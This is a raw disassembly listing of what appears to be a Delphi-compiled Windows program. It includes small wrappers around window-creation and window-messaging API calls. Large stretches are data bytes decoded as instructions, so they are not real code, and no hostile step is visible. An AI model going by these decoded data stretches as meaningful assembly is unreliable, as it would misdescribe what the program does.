or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x1825ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
adc [ ebx - 0x3f74ffb9 ] al
jmp [ EnterCriticalSection@IAT ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
add [ ebx + 0x425ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
add [ ebx - 0x3f74ffb9 ] al
jmp [ FindClose@IAT ]
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x2025ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
sbb al 0x83
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
call 0x640a048
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x1425ffc0 ] cl
add [ edi ] 0xffffff8b
mov eax eax
add esi [ edi + ebx * 2 ]
inc eax
add [ ebx + 0x825ffc0 ] cl
add [ edi ] 0x8b
sar bh 0x25
add al 0x82
inc edi
add [ ebx + 0x25ffc0 ] cl
add [ edi ] 0x8b
sar bh 0x25
and al 0x83
inc edi
sub_406a40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a44
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406a98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a44
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406af0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406be5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406c0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c14
retn
sub_406c20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406c45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c4c
retn
sub_406c58
push esi
inc edi
add al dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ eax + 0x640000ff ] dh
push esi
inc edi
add [ ecx + 0x640000ff ] dh
push esi
inc edi
add [ edx + 0x640000ff ] dh
push esi
inc edi
add [ ebx + 0x640000ff ] dh
push esi
inc edi
add [ edi + edi * 8 + 0x56640000 ] dh
inc edi
add [ ebp + 0x640000ff ] dh
push esi
inc edi
add [ esi + 0x640000ff ] dh
push esi
inc edi
add [ edi + 0x640000ff ] dh
push esi
inc edi
add [ eax + 0x640000ff ] bh
push esi
inc edi
add [ ecx + 0x640000ff ] bh
push esi
inc edi
add [ edx + 0x640000ff ] bh
push esi
inc edi
add [ ebx + 0x640000ff ] bh
push esi
inc edi
add [ edi + edi * 8 + 0x56640000 ] bh
inc edi
add [ ebp + 0x640000ff ] bh
push esi
inc edi
add [ esi + 0x640000ff ] bh
push esi
inc edi
add [ edi + 0x640000ff ] bh
push esi
inc edi
add [ eax + 0x640000ff ] ah
push esi
inc edi
add [ ecx + 0x640000ff ] ah
push esi
inc edi
add [ edx + 0x640000ff ] ah
push esi
inc edi
add [ ebx + 0x640000ff ] ah
push esi
inc edi
add [ edi + edi * 8 + 0x56640000 ] ah
inc edi
add [ ebp + 0x640000ff ] ah
push esi
inc edi
add [ esi + 0x640000ff ] ah
push esi
inc edi
add [ edi + 0x640000ff ] ah
push esi
inc edi
add [ eax + 0x640000ff ] ch
push esi
inc edi
add [ ecx + 0x640000ff ] ch
push esi
inc edi
add [ edx + 0x640000ff ] ch
push esi
inc edi
add [ ebx + 0x640000ff ] ch
push esi
inc edi
add [ edi + edi * 8 - 0x74ab0000 ] ch
in al dx
xor eax eax
push ebp
push sub_406f65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f6c
retn
sub_406f8c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x6f
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
outsd
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004070 ] bl
add [ eax ] al
add al dh
outsd
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
outsd
outsb
cmp al 0x70
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 ] bh
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbf91 ] cl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
test [ eax + 0x32480040 ] bh
inc eax
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
add [ eax ] al
dec esp
jno r-xdata
lea eax [ eax ]
xor [ eax ] eax
test [ eax + 0x32480040 ] bh
inc eax
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
test al 0x34
inc eax
add al dh
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x100040 ] ah
add [ eax ] al
add [ ecx + 0x40 ] dh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbf91 ] cl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
hlt
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
imul ebp [ edi + 0x6e ] 0x40709890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x10004073
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x40 ] bl
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x72
popad
insb
mov eax eax
movsb [ edi ] [ esi ]
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jae r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbf8f ] bh
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x100040 ] dh
add [ eax ] al
mov eax 0xa0004071
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbf8f ] bh
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
mov ah 0x72
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ ebx + esi * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax + eax * 2 ] dh
adc [ eax ] al
add [ eax ] al
sbb al 0x73
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
jbe r-xdata
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
jb r-xdata
imul ebp [ edi + 0x6e ] 0x40720490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x72
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbf8f ] bh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74 ] dh
inc eax
add [ eax ] dl
add [ eax ] al
add [ ebx + esi * 2 ] bl
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax ] dl
add [ eax ] al
add [ ebx + esi * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40741890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
je r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x74706564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
je r-xdata
outsd
jb r-xdata
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebx + 0x40 ] 0x0
adc [ eax ] al
add [ eax ] al
sbb al 0x73
insb
outsd
ja r-xdata
inc eax
rcr [ edx + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebp + 0x40 ] dh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jne r-xdata
add [ eax ] dl
add [ eax ] al
add [ ebx + esi * 2 ] bl
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
or al 0x32
shl [ ebx + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
jno r-xdata
inc eax
add [ eax + 0x73 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x73 ] ch
inc eax
add [ eax ] dl
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] bh
add [ eax ] dl
add [ eax ] al
add al dh
outsd
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
test [ eax + 0x32480040 ] bh
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] dh
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] al
jno r-xdata
lea eax [ eax ]
fdiv [ ebp + 0x40 ]
jne r-xdata
jne r-xdata
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
inc eax
ror al 0x74
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x6e6f4345 ] cl
jbe r-xdata
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] cl
inc ebp
dec edi
jbe r-xdata
[ eax ] eax
and [ ebp + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add al bl
jne r-xdata
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
outsb
lea eax [ eax ]
xchg esp eax
jbe r-xdata
jb r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
push eax
jb r-xdata
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x100040 ] dl
add [ eax ] al
add [ ecx + 0x40 ] dh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
ja r-xdata
insb
nop
in al dx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jbe r-xdata
outsd
jb r-xdata
inc eax
add al dh
sar ah 0x77
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004077 ] ah
xor [ eax ] eax
or al 0x32
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] cl
inc eax
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
inc ebp
push ebx
je r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] al
jno r-xdata
inc eax
shl [ esi + esi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
ja r-xdata
outsd
insb
inc ebx
add [ eax ] al
